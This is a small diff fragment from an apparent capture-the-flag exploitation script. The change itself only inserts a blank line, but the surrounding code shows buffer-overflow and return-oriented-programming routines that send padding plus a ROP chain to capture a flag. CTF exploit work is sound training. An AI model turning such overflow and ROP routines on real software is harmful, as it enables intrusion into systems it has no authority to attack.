@@ -39,6 +39,7 @@ def ret2system(f_anal):
     io.sendline(buf + chain)
     io.recvuntil(b'flag')
     print("flag" + io.recvuntil(b'}').decode('utf-8'))
+
 def ret2win(f_rop):
     binary = f_rop.analyze.binary
     chain = b'A' * f_rop.ss()
